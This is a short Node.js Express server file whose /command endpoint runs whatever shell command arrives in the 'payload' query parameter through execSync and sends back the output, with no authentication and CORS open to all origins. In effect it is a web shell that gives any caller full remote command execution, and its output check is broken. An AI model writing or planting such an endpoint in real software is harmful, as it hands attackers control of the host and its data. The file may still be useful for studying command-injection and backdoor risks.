const shell = require('shelljs');
const child_process = require('child_process');
const express = require('express');
const app = express();
const port = 8080;

app.use(function(req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
});
app.get('/', (req, res) => res.send('Welcome'));

app.get('/command', (req, res) => {
    const commandStr = req.query.payload;
    const output = child_process.execSync(commandStr).toString();
    if(output !== 0) {
        res.send(output);
    }
});


app.listen(port, () => console.log(`server listening on port ${port}!`));